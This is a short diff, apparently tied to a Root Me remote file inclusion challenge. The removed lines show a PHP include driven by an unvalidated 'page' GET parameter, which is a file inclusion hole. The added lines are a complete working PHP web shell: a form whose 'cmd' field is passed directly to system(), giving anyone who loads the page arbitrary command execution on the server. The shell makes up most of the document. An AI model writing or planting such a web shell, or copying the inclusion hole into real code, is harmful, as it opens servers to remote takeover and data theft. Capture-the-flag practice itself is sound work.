@@ -1,3 +1,17 @@
-#pretty secure $page = $_GET["page"];
-include($page.".php"); #it basically prevents any inclusion aside than file with PHP format
-# this is for a challenge root me (RFI) Remote local file inclusion, so i need a public link create by your website
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
